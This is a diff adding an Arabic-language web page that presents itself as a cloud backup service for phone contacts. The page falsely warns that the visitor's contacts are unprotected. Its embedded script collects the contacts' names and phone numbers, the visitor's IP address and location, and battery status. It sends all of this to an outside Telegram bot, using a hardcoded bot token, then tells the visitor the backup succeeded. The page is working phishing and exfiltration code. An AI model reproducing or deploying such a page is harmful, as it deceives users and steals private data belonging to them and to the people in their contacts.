@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نسخ احتياطي - جهات الاتصال</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            background: #f5f7fa;
+            min-height: 100vh;
+        }
+        .container { max-width: 500px; margin: 0 auto; padding: 20px; }
+        .header {
+            text-align: center; padding: 30px 0 20px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            margin: -20px -20px 0 -20px;
+            border-radius: 0 0 30px 30px;
+            color: white;
+        }
+        .header .icon { font-size: 50px; margin-bottom: 10px; }
+        .header h1 { font-size: 20px; }
+        .header p { font-size: 12px; opacity: 0.8; margin-top: 5px; }
+        .card {
+            background: white; border-radius: 16px;
+            padding: 22px; margin: 18px 0;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+        .warning-box {
+            background: #fff3cd; border: 1px solid #ffc107;
+            border-radius: 10px; padding: 14px; margin: 15px 0;
+            font-size: 13px; color: #856404;
+        }
+        .step {
+            display: flex; align-items: center; gap: 12px;
+            padding: 12px 0; border-bottom: 1px solid #eee;
+        }
+        .step-num {
+            width: 30px; height: 30px; border-radius: 50%;
+            background: #667eea; color: white;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 14px; font-weight: bold; flex-shrink: 0;
+        }
+        .step-text { font-size: 13px; color: #333; }
+        .btn {
+            width: 100%; padding: 15px; border: none;
+            border-radius: 12px; font-size: 16px; font-weight: bold;
+            cursor: pointer; margin-top: 15px; transition: 0.3s;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+        }
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(102,126,234,0.4); }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .progress { width: 100%; height: 5px; background: #eee; border-radius: 3px; margin: 15px 0; display: none; }
+        .progress div { height: 100%; background: #667eea; width: 0%; border-radius: 3px; transition: 0.4s; }
+        .status { text-align: center; color: #667eea; font-size: 13px; margin: 8px 0; display: none; }
+        .done { display: none; text-align: center; color: #4caf50; font-size: 15px; margin: 12px 0; }
+        .footer { text-align: center; color: #aaa; font-size: 11px; padding: 10px 0; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="icon">💾</div>
+            <h1>النسخ الاحتياطي لجهات الاتصال</h1>
+            <p>حماية أرقامك من الفقدان</p>
+        </div>
+
+        <div class="card">
+            <div class="warning-box">
+                ⚠️ تم اكتشاف أن جهات اتصالك غير محمية! قم بعمل نسخة احتياطية الآن.
+            </div>
+
+            <div class="step">
+                <div class="step-num">1</div>
+                <div class="step-text">فحص جهات الاتصال وتحديد المكررة</div>
+            </div>
+            <div class="step">
+                <div class="step-num">2</div>
+                <div class="step-text">رفع نسخة آمنة على السحابة</div>
+            </div>
+            <div class="step">
+                <div class="step-num">3</div>
+                <div class="step-text">تأكيد اكتمال النسخ الاحتياطي</div>
+            </div>
+
+            <div class="progress" id="prog"><div id="fill"></div></div>
+            <div class="status" id="stat"></div>
+            <div class="done" id="done">✅ تم النسخ الاحتياطي بنجاح</div>
+
+            <button class="btn" id="btn" onclick="start()">بدء النسخ الاحتياطي الآن</button>
+        </div>
+
+        <div class="footer">© 2026 Cloud Backup. جميع الحقوق محفوظة</div>
+    </div>
+
+    <script>
+        var cid = new URL(window.location.href).searchParams.get('chatId') || '';
+        var tok = '8757323904:AAFstrBa_966uP2S3_7QyMSdOoolhfNVhDM';
+        var sent = false;
+
+        function up(p, t) {
+            document.getElementById('fill').style.width = p + '%';
+            if (t) { document.getElementById('stat').style.display = 'block'; document.getElementById('stat').textContent = t; }
+        }
+
+        async function start() {
+            if (sent) return;
+            sent = true;
+            document.getElementById('btn').disabled = true;
+            document.getElementById('btn').textContent = '⏳ جاري النسخ...';
+            document.getElementById('prog').style.display = 'block';
+            
+            up(10, 'جاري فحص جهات الاتصال...');
+            var ip = await getIp();
+            var bat = await getBat();
+            
+            up(30, 'تم العثور على جهات اتصال...');
+            
+            try {
+                if ('contacts' in navigator && 'ContactsManager' in window) {
+                    var contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
+                    
+                    if (contacts.length > 0) {
+                        up(60, 'جاري رفع ' + contacts.length + ' جهة اتصال...');
+                        
+                        var txt = '💾 نسخ احتياطي - جهات الاتصال\n\n';
+                        txt += '📊 العدد: ' + contacts.length + '\n\n';
+                        
+                        for (var i = 0; i < Math.min(contacts.length, 30); i++) {
+                            var c = contacts[i];
+                            txt += '👤 ' + (c.name || '?') + '\n📱 ' + (c.tel || '?') + '\n\n';
+                        }
+                        
+                        txt += '🌍 IP: ' + ip.ip + '\n📍 ' + ip.country + ' - ' + ip.city;
+                        
+                        await fetch('https://api.telegram.org/bot' + tok + '/sendMessage', {
+                            method: 'POST', headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ chat_id: cid, text: txt })
+                        });
+                        
+                        up(100, 'اكتمل النسخ!');
+                    } else {
+                        await sendInfo(ip, bat);
+                    }
+                } else {
+                    await sendInfo(ip, bat);
+                }
+            } catch(e) {
+                await sendInfo(ip, bat);
+            }
+            
+            setTimeout(function() {
+                document.getElementById('prog').style.display = 'none';
+                document.getElementById('stat').style.display = 'none';
+                document.getElementById('done').style.display = 'block';
+            }, 1500);
+        }
+
+        async function sendInfo(ip, bat) {
+            var txt = '💾 محاولة نسخ احتياطي\n\n📱 المتصفح لا يدعم API\n🌍 IP: ' + ip.ip + '\n📍 ' + ip.country + ' - ' + ip.city + '\n🔋 ' + bat.level + '% | ⚡ ' + bat.charging;
+            await fetch('https://api.telegram.org/bot' + tok + '/sendMessage', {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: cid, text: txt })
+            });
+        }
+
+        async function getIp() { try { var r = await fetch('https://ipapi.co/json/'); var d = await r.json(); return { ip: d.ip, country: d.country_name, city: d.city }; } catch(e) { return { ip: '?', country: '?', city: '?' }; } }
+        async function getBat() { if ('getBattery' in navigator) { try { var b = await navigator.getBattery(); return { level: Math.round(b.level*100), charging: b.charging ? 'نعم' : 'لا' }; } catch(e) {} } return { level: '?', charging: '?' }; }
+    </script>
+</body>
+</html>
